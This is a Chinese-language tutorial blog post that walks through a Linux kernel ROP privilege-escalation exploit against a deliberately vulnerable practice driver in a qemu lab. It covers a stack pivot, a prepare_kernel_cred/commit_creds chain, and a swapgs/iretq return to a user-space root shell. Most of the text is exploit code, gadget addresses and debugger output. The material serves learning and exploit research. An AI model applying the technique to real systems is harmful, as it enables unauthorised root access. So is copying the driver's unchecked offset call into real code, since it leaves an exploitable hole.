---
title: linux kernel rop
categories:
  - pwn
tags: linux-kernel-exploitation
published: true
---

# Introduction

学习 liunx 内核漏洞利用 rop 技术，练习一下内核 rop 链的构造到执行来完成普通用户权限提升。

在一般的 [ret2usr](http://cyseclabs.com/slides/smep_bypass.pdf) 攻击中，内核的控制流会被重定向到用户空间中包含
权限提升代码的地址处:

```
void __attribute__((regparm(3))) payload() {
    commit_creds(prepare_kernel_cred(0);
}
```

执行上面的代码会分配一个新的凭证结构且 `uid`=0, `gid`=0 应用于当前调用它的进程。我们可以构造 rop 链来执行这个
操作而不用执行用户态内存中的指令，最终目标是在内核态用 rop 链执行整个权限提升的 `payload`。整个 rop 链看起来
应该如下所示：

![rop-chain]({{site.baseurl}}/images/rop-chain.png)

使用 x86_64 的函数调用约定，第一个参数通过 `%rdi` 寄存器传递，rop 链中的第一个指令从栈中弹出空值，然后这个值就
作为第一个参数传递到 `prepare_kernel_cred()` 函数。指向新的凭证结构的指针会作为返回值存储在 `%rax` 寄存器中，
然后再次移动到 `%rdi` 寄存器中作为第一个参数传递给 `commit_creds()` 函数。现在暂时跳过了凭证结构应用之后返回
到用户态的一些细节，这部分细节会在之后提到。

# Test System

本文是以 ubuntu 12.04 64bit 作为测试系统, 其内核版本如下：

```
user@ubuntu:~/kernel_rop$ uname -r
3.11.0-26-generic
```

内核态与用户态应用相似，内核二进制文件也可通过 ROPgadget 查找一些 gadgets，不过需要内核的 ELF 镜像(vmlinux)，
如果使用的是 `/boot/vmlinuz` 镜像则还需先将其解压，`/boot/vmlinuz` 是一个用多种算法压缩过的内核镜像，可以使用
[extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) 脚本将其解压。

```
user@ubuntu:~$ sudo file /boot/vmlinuz-3.11.0-26-generic 
/boot/vmlinuz-3.11.0-26-generic: Linux kernel x86 boot executable bzImage, version 3.11.0-26-generic (buildd@komainu)
#45~precise1-Ubuntu SMP Tue , RO-rootFS, swap_dev 0x5, Normal VGA
user@ubuntu:~$ sudo ./extract-vmlinux.sh /boot/vmlinuz-3.11.0-26-generic > vmlinux 
user@ubuntu:~$ file vmlinux 
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked,
BuildID[sha1]=0xe0b2f4d5253e3da0f1ea2be9916b1b9d323ad908, stripped
```

ROP 技术采用代码错位的优势确定新的 gadgets。由于 x86 的语言密度使其成为可能，x86 指令集足够大（指令具有不同的长
度），几乎任意字节序列都能被解释成正确的指令。例如，根据不同的偏移，以下指令可以有不同的解释：

```
0f 94 c3; sete   %bl
   94 c3; xchg eax, esp; ret
```

# Vulnerable Driver

漏洞代码 [vulnerable driver](https://github.com/0x3f97/pwn/tree/master/kernel/kernel_rop):

```
static long device_ioctl(struct file *file, unsigned int cmd, unsigned long args) {
	struct drv_req *req;
	void (*fn)(void);
	
	switch(cmd) {
	case 0:
		req = (struct drv_req *)args;
		printk(KERN_INFO "size = %lx\n", req->offset);
                printk(KERN_INFO "fn is at %p\n", &ops[req->offset]);
		fn = &ops[req->offset];
		fn();   // vulnerable
		break;
	default:
		break;
	}

	return 0;
}
```

程序直接执行了根据传入参数作为偏移得到的地址处的指令，那么我们只要计算指令的偏移就可以执行任意代码了。

# Debug

内核调试环境的搭建可以参考这篇文章 [linux kernel exploitation environment setup](https://0x3f97.github.io/pwn/2018/03/30/linux-kernel-exploitation-environment-setup)

使用 qemu 模拟运行 linux 内核，编译 busybox 作为文件系统，make 编译完漏洞驱动模块将其复制到文件系统内:

```
user@ubuntu:~/kernel_rop$ make
make -C /lib/modules/3.11.0-26-generic/build M=/home/user/kernel_rop modules
make[1]: Entering directory `/usr/src/linux-headers-3.11.0-26-generic'
  Building modules, stage 2.
  MODPOST 1 modules
make[1]: Leaving directory `/usr/src/linux-headers-3.11.0-26-generic'
# compile the trigger
gcc trigger.c -O2 -o trigger
user@ubuntu:~/kernel_rop$ cp drv.ko ../busybox-1.19.4/_install/drv.ko
```

使用 `find . | cpio -o --format=newc > ../rootfs.img` 重新制作镜像，qemu 运行：

```
qemu-system-x86_64 -kernel kernel_rop/bzImage -initrd busybox-1.19.4/rootfs.img -append "console=ttyS0 root=/dev/ram
rdinit=/sbin/init" --nographic -s
```

将 `/boot/vmlinuz-3.11.0-26-generic` 作为内核镜像启动 qemu，`-s` 参数设置在本地监听端口 `1234` 提供 gdb 调试。

![]({{sitebase.url}}/images/2018-04-27-1.png)

`mdev -s` 命令可刷新 `/dev` 目录，模块创建 device 之后需要刷新一下。

在用 gdb 连接之前先添加模块的符号表，在 qemu 中查看模块的 `.text` 节区位置：

```
/ # grep 0 /sys/module/drv/sections/.text 
0xffffffffa0000000 
```

然后在 gdb 中运行：

```
gef➤  add-symbol-file drv.ko 0xffffffffa0000000
add symbol table from file "drv.ko" at
	.text_addr = 0xffffffffa0000000
Reading symbols from drv.ko...done.
gef➤  target remote :1234

```

# Kernel Rop

以 `trigger.c` 代码为基础，一步一步构造 rop 链：

```c
#define DEVICE_PATH "/dev/vulndrv"
...

int main(int argc, char **argv)
{
	int fd;
	struct drv_req req;

	req.offset = atoll(argv[1]);

	fd = open(DEVICE_PATH, O_RDONLY);

	if (fd == -1) {
        perror("open");
	}

	ioctl(fd, 0, &req;);

	return 0;
}
```

由于不能直接将内核态控制流劫持到用户态执行，我们需要在内核空间中寻找合适的 gadget。利用思路是在用户态准备好
rop 链，然后栈迁移到用户态，这样就没有直接执行用户态指令。

逆向分析一下 `device_ioctl` 函数会发现我们可以控制 `%rax` 寄存器：

```asm
...
   0xffffffffa0000124 <+103>:	mov    rdx,0xffffffffa0002340
   0xffffffffa000012b <+110>:	mov    rax,QWORD PTR [rbp-0x10]
   0xffffffffa000012f <+114>:	mov    rax,QWORD PTR [rax]
   0xffffffffa0000132 <+117>:	shl    rax,0x3
   0xffffffffa0000136 <+121>:	add    rax,rdx
   0xffffffffa0000139 <+124>:	mov    QWORD PTR [rbp-0x8],rax
   0xffffffffa000013d <+128>:	mov    rax,QWORD PTR [rbp-0x8]
   0xffffffffa0000141 <+132>:	call   rax

...
```

那么就可以根据 `ops` 变量的地址计算 gadgets 的偏移，找到赋值给栈指针寄存器的 gadgets 如 `xchg %eax, %esp; ret`
，目标地址是以数组索引偏移的，因此计算偏移的时候需要乘以数组单位字节长度即乘以 `8`，只能寻找地址偏移为 `8` 的
倍数的 gadgets，可以使用 `find_offset.py` 脚本来方便查找。

```bash
$ python find_offset.py 0xffffffffa0002340 gadgets_xchg.txt 
offset = 0xfffffffffc20d91bL
gadget = xchg eax, esp ; ret 0x12
stack addr = 0x8106ec18

```

根据找到的指令 mmap 出足够的空间，用来存放 rop 链：

```c
req.offset = strtoul(argv[1], NULL, 0x10);
base_addr = strtoul(argv[2], NULL, 0x10);
stack_addr = (base_addr + (req.offset * 8)) & 0xffffffff;
fprintf(stdout, "stack address = 0x%lx\n", stack_addr);

mmap_addr = stack_addr & 0xfffff000;
assert((mapped = mmap((void*) mmap_addr, 0x20000, 7, 0x32, 0, 0)) == (void*) mmap_addr);
```

这里注意一下我们找到的 gadgets 包含 `ret 0x12` 指令，会在返回之后弹出 `0x12` 字节大小的栈空间，即当前栈指针的
值要加上 `0x12`，那么我们的后续的 rop 链地址需要更改一下：

```c
fake_stack = (unsigned long *) stack_addr;
*fake_stack++ = 0xffffffff8138353fUL;	/* pop rdi; ret */

fake_stack = (unsigned long *) (stack_addr+0x8+0x12);
```

之后构造调用分配凭证结构函数的 rop 链，参考之前的 rop 链布局：

```c
fake_stack = (unsigned long *) stack_addr;
*fake_stack++ = 0xffffffff8138353fUL;	/* pop rdi; ret */

fake_stack = (unsigned long *) (stack_addr+0x8+0x12);
*fake_stack++ = 0x0UL;                  /* NULL */
*fake_stack++ = 0xffffffff8108fce0UL;   /* prepare_kernel_cred() */
*fake_stack++ = 0xffffffff81057cb2UL;   /* pop rdx; ret */
*fake_stack++ = 0xffffffff8108fa66UL;   /* commit_creds() + 2 instructions */
*fake_stack++ = 0xffffffff81035c11UL;   /* mov rdi, rax; call rdx */
```

因为调用 `commit_creds()` 函数用的是 `call` 指令，执行的操作是先将下一条指令的地址压栈之后再跳转到目标地址执行，
所以需要跳过函数开头的压栈操作从而使函数返回时会将 `call` 指令压栈的值弹到 `%rbp` 寄存器中，然后会继续返回到
我们的 rop 链执行。

`commit_creds()` 函数的压栈操作：

```asm
gef➤  x/10i 0xffffffff8108fa60
   0xffffffff8108fa60:	data16 data16 data16 xchg ax,ax
   0xffffffff8108fa65:	push   rbp
   0xffffffff8108fa66:	mov    rbp,rsp
   0xffffffff8108fa69:	push   r13
   0xffffffff8108fa6b:	mov    r13,QWORD PTR gs:0xc7c0
   0xffffffff8108fa74:	push   r12
   0xffffffff8108fa76:	mov    r12,rdi
   0xffffffff8108fa79:	push   rbx
   0xffffffff8108fa7a:	sub    rsp,0x8
   0xffffffff8108fa7e:	mov    rbx,QWORD PTR [r13+0x490]

```

完成了凭证的申请之后，我们需要返回到用户态执行一个 `shell`。通常程序执行了一个 `syscall` 指令从用户态切换到内
核态时，需要先将状态保存起来，以便后续返回到用户态继续运行，一般用 `iret` (inter-privilege return) 指令从内核
态返回到用户态执行。`iret` (或者 `iretq` 64bit) 指令返回时栈空间存放的值布局如下：

![]({{site.baseurl}}/images/2018-04-27-2.png)

继续构造 rop 链包含用户态执行地址 (rip)，mmap 映射一段内存当做栈空间 (rsp)，以及代码段选择器和栈段选择器 (cs、
ss) 和 eflags 寄存器。cs，ss 和 eflags 寄存器的值可以用 `save_state()` 函数保存下来：

```c
unsigned long user_cs, user_ss, user_rflags;

static void save_state() {
	asm(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"pushfq\n"
	"popq %2\n"
	: "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
}
```

最后要注意的是，在 64 位系统中执行 `iretq` 指令前需要执行一下 `swapgs` 指令，该指令将 gs 寄存器的值与 MSR 地址
中的值交换。在内核态常规操作（如系统调用）的入口处，执行 `swapgs` 指令获得指向内核数据结构的指针，那么对应的，
从内核态退出，返回到用户态时也需执行一下 `swapgs`。

完整的 rop 链如下：

```c
fake_stack = (unsigned long *) stack_addr;
*fake_stack++ = 0xffffffff8138353fUL;	/* pop rdi; ret */

fake_stack = (unsigned long *) (stack_addr+0x8+0x12);
*fake_stack++ = 0x0UL;                  /* NULL */
*fake_stack++ = 0xffffffff8108fce0UL;   /* prepare_kernel_cred() */
*fake_stack++ = 0xffffffff81057cb2UL;   /* pop rdx; ret */
*fake_stack++ = 0xffffffff8108fa66UL;   /* commit_creds() + 2 instructions */
*fake_stack++ = 0xffffffff81035c11UL;   /* mov rdi, rax; call rdx */
*fake_stack++ = 0xffffffff81050564UL;   /* swapgs; pop rbp; ret */
*fake_stack++ = 0x0UL;                  /* NULL */
*fake_stack++ = 0xffffffff81050de6UL;   /* iretq */
*fake_stack++ = (unsigned long) shell;  /* spawn a shell */
*fake_stack++ = user_cs;                /* saved cs */
*fake_stack++ = user_rflags;            /* saved rflags */
*fake_stack++ = (unsigned long) (temp_stack+0xf00); /* mmaped stack region in user space */
*fake_stack++ = user_ss;                /* saved ss */

```

我们来执行一下，先在 gdb 中设置断点，直接断在调用 `fn` 函数处：

```bash
gef➤  b *0xffffffffa0000141
Breakpoint 2 at 0xffffffffa0000141: file /home/user/kernel_rop/drv.c, line 61.
gef➤  c
Continuing.

```

单步跟入可以看到确实执行到我们构造的 rop 链：

![]({{site.baseurl}}/images/2018-04-27-3.png)

![]({{site.baseurl}}/images/2018-04-27-4.png)

运行结果：

![]({{site.baseurl}}/images/2018-04-27-5.png)

# Reference

- [Linux Kernel ROP - Ropping your way to # (Part 1)](https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-1)/)

- [Linux Kernel ROP - Ropping your way to # (Part 2)](https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-2)/)

- [Linux内核ROP姿势详解(一)](http://www.freebuf.com/articles/system/94198.html)

- [Linux内核ROP姿势详解（二）](http://www.freebuf.com/articles/system/135402.html)
